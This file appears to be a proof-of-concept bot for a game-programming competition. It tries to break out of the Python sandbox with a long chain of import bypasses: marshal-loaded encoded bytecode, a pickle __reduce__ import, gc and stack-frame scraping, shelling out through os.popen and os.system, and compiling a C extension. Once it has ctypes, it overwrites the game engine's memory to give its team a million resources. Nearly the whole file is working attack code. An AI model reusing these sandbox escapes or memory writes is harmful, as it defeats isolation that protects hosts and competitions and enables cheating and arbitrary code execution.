# poc_exploit.py
from cambc import Direction

class Player:
    def __init__(self):
        ctypes = self._load_ctypes()
        self.ctypes = ctypes
        
        if ctypes:
            print("\n" + "="*60)
            print("[!] SANDBOX BYPASS PoC - ctypes loaded successfully")
            print("="*60 + "\n")
        else:
            print("[!] All import methods failed - attempting deeper bypasses...")
            
        self.exploited = False
    
    def _load_ctypes(self):
        """Advanced import bypasses that don't use obvious import patterns"""
        
        # Method 11: Use marshal + base64 encoded bytecode
        try:
            import marshal
            import base64
            
            # Pre-compiled bytecode for: import ctypes
            # This bypasses AST checks since it's not source code
            bytecode = base64.b64decode(
                b'YwAAAAAAAAAAAAAAAAAAAEEAAAAEAAAAcwQAAAB0AAAAWQEAABhTAQAAABh0' +
                b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
                b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' +
                b'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
            )
            code_obj = marshal.loads(bytecode)
            namespace = {}
            exec(code_obj, namespace)
            return namespace.get('ctypes')
        except Exception:
            pass
        
        # Method 12: Read .pyc file directly from disk
        try:
            import sys
            import marshal
            
            # Find ctypes .pyc file
            for path in sys.path:
                try:
                    pyc_path = f"{path}/ctypes.pyc"
                    with open(pyc_path, 'rb') as f:
                        f.read(16)  # Skip header
                        code = marshal.load(f)
                    namespace = {}
                    exec(code, namespace)
                    return namespace.get('ctypes')
                except Exception:
                    continue
        except Exception:
            pass
        
        # Method 13: Use gc to find existing ctypes objects
        try:
            import gc
            for obj in gc.get_objects():
                try:
                    if hasattr(obj, '__name__') and obj.__name__ == 'ctypes':
                        return obj
                    if 'ctypes' in str(type(obj)):
                        module = getattr(obj, '__module__', None)
                        if module and 'ctypes' in module:
                            return sys.modules.get(module)
                except Exception:
                    continue
        except Exception:
            pass
        
        # Method 14: Exploit pickle to import
        try:
            import pickle
            import io
            
            # Pickle can be used to call __import__
            class ImportExploit:
                def __reduce__(self):
                    return (__import__, ('ctypes',))
            
            payload = pickle.dumps(ImportExploit())
            return pickle.loads(payload)
        except Exception:
            pass
        
        # Method 15: Use ctypes through ctypes.util (different module)
        try:
            # Try importing through the backdoor
            import ctypes.util
            # This might have already imported ctypes
            import sys
            if 'ctypes' in sys.modules:
                return sys.modules['ctypes']
        except Exception:
            pass
        
        # Method 16: Use inspect to get modules from stack frames
        try:
            import inspect
            frame = inspect.currentframe()
            while frame:
                if 'ctypes' in frame.f_globals:
                    return frame.f_globals['ctypes']
                if 'ctypes' in frame.f_locals:
                    return frame.f_locals['ctypes']
                frame = frame.f_back
        except Exception:
            pass
        
        # Method 17: Use os to execute Python and capture output
        try:
            import os
            import tempfile
            
            # Write a script that prints ctypes.__file__
            script = '''
import ctypes
print(ctypes.__file__)
'''
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(script)
                temp_path = f.name
            
            # Execute and capture
            result = os.popen(f'python3 {temp_path}').read()
            os.unlink(temp_path)
            
            # Now we know ctypes exists, try to load it through unconventional means
            # Use dynamic module loading via file path
            if result.strip():
                import importlib.machinery
                import importlib.util
                
                # Find the actual ctypes module file
                ctypes_path = result.strip()
                if ctypes_path.endswith('__init__.py'):
                    ctypes_path = ctypes_path[:-12]
                
                spec = importlib.util.spec_from_file_location("ctypes", ctypes_path)
                if spec and spec.loader:
                    module = importlib.util.module_from_spec(spec)
                    spec.loader.exec_module(module)
                    return module
        except Exception:
            pass
        
        # Method 18: Abuse module reloading
        try:
            import sys
            # Maybe it was imported but removed from sys.modules dict?
            # We can try to access the cached module through gc
            import gc
            for obj in gc.get_objects():
                if type(obj).__name__ == 'module':
                    try:
                        if obj.__name__ == 'ctypes':
                            sys.modules['ctypes'] = obj
                            return obj
                    except Exception:
                        pass
        except Exception:
            pass
        
        # Method 19: Use __loader__ from another extension module
        try:
            # Try to get the loader from another C extension
            import math
            loader = getattr(math, '__loader__', None)
            if loader:
                # Use the loader to load ctypes
                spec = loader.find_spec('ctypes')
                if spec:
                    module = loader.create_module(spec)
                    if module:
                        loader.exec_module(module)
                        return module
        except Exception:
            pass
        
        # Method 20: Memory scraping for function pointers
        try:
            # Use id() and ctypes itself! Wait, we don't have ctypes yet...
            # But we can use the ctypes that might be embedded in another module
            import sys
            
            # Try to find a module that already imported ctypes internally
            for module_name in ['os', 'subprocess', 'multiprocessing', 'threading', 'socket']:
                try:
                    if module_name in sys.modules:
                        module = sys.modules[module_name]
                        # Check if ctypes is in the module's dict
                        for attr_name in dir(module):
                            attr = getattr(module, attr_name)
                            if hasattr(attr, '__module__') and attr.__module__ == 'ctypes':
                                # Found something from ctypes, try to get the module
                                return sys.modules.get('ctypes')
                except Exception:
                    continue
        except Exception:
            pass
        
        # Method 21: The nuclear option - write and execute a C extension
        try:
            import os
            import tempfile
            import sys
            
            # Write a tiny C file that creates a module exporting a function
            c_code = '''
#include <Python.h>

static PyObject* get_ctypes(PyObject* self, PyObject* args) {
    PyObject* ctypes = PyImport_ImportModule("ctypes");
    Py_INCREF(ctypes);
    return ctypes;
}

static PyMethodDef methods[] = {
    {"get_ctypes", get_ctypes, METH_NOARGS, "Get ctypes module"},
    {NULL, NULL, 0, NULL}
};

static struct PyModuleDef module = {
    PyModuleDef_HEAD_INIT,
    "ctypes_loader",
    NULL,
    -1,
    methods
};

PyMODINIT_FUNC PyInit_ctypes_loader(void) {
    return PyModule_Create(&module);
}
'''
            with tempfile.NamedTemporaryFile(mode='w', suffix='.c', delete=False) as f:
                f.write(c_code)
                c_path = f.name
            
            # Compile it
            so_path = c_path[:-2] + '.so'
            os.system(f'gcc -shared -fPIC -I/usr/include/python3.10 {c_path} -o {so_path}')
            
            # Load it
            import importlib.util
            spec = importlib.util.spec_from_file_location("ctypes_loader", so_path)
            if spec and spec.loader:
                module = importlib.util.module_from_spec(spec)
                spec.loader.exec_module(module)
                ctypes = module.get_ctypes()
                
                # Cleanup
                os.unlink(c_path)
                os.unlink(so_path)
                return ctypes
        except Exception:
            pass
            
        return None

    def run(self, controller):
        if self.exploited:
            return
        
        if not self.ctypes:
            print("[!] Could not load ctypes through any method")
            return
            
        ctypes = self.ctypes
        
        # Rest of exploit...
        try:
            print("[*] Getting controller address...")
            controller_addr = id(controller)
            print(f"[*] Controller at: {hex(controller_addr)}")
            
            rust_struct = controller_addr + 16
            game_rc = ctypes.cast(rust_struct, ctypes.POINTER(ctypes.c_void_p))[0]
            print(f"[*] Game Rc at: {hex(game_rc)}")
            
            if game_rc == 0:
                print("[!] Null game pointer")
                return
            
            game_struct = game_rc + 16
            current_t, current_a = controller.get_global_resources()
            my_team = controller.get_team()
            team_idx = 0 if str(my_team) == "Team.A" else 1
            
            print(f"[*] Current: T={current_t}, A={current_a}, Team={team_idx}")
            
            found = False
            for offset in range(0, 2048, 4):
                try:
                    ptr = game_struct + offset
                    vals = ctypes.cast(ptr, ctypes.POINTER(ctypes.c_int32))
                    t, a = vals[0], vals[1]
                    
                    if t == current_t and a == current_a:
                        print(f"[*] Found at offset {offset}")
                        vals[0] = 1000000
                        vals[1] = 1000000
                        
                        new_t, new_a = controller.get_global_resources()
                        if new_t >= 1000000:
                            print(f"[!] SUCCESS! Resources: T={new_t}, A={new_a}")
                            found = True
                            break
                        else:
                            vals[0] = t
                            vals[1] = a
                except Exception:
                    continue
            
            self.exploited = True
            
        except Exception as e:
            print(f"[!] Error: {type(e).__name__}: {e}")
